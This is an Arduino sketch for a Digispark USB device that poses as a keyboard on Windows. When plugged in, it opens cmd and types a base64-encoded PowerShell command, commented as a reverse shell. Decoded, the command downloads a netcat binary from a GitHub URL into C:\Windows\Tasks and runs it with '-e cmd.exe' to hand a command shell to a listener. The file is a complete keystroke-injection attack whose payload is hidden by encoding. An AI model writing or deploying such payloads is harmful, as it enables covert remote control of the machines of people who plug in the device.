#include <stdlib.h>
#include "DigiKeyboard.h"

void setup() {
  // windows - abre cmd
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  
  // windows - reverse shell
  DigiKeyboard.print("powershell -e SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcV2luZG93c1xUYXNrc1xuYy5leGU7IEM6XFdpbmRvd3NcVGFza3NcbmMuZXhlIC1lIGNtZC5leGUgMTI3LjAuMC4xIDEyMzQK");
  DigiKeyboard.delay(1000);
 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}


